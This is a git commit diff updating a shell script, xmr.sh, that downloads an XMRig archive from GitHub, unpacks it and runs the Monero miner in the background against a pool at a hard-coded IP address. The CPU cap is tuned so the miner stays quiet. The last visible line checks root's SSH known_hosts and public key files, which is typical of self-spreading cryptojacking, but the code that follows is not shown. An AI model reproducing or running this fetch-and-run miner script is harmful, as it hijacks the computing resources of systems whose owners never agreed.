0a20400da31919fe8b4e1864e793ab0d3710aec1
Pamentierx <64346082+Pamentierx@users.noreply.github.com>
2021-09-06 11:33:15 +0800

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,8 +1,8 @@
-wget https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
-tar -xvzf xmr.tar.gz
-cd xmrig-6.14.1
-chmod +x xmrig
-./xmrig -o 107.182.176.159:8989 -u worker2 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=40% --nicehash
+wget -P ./tmp/ https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
+tar -xvzf ./tmp/xmr.tar.gz
+cd ./tmp/xmrig-6.14.1
+chmod +x ./tmp/xmrig
+./tmp/xmrig -o 107.182.176.159:8989 -u worker3 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=50% --nicehash
 
 
 if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
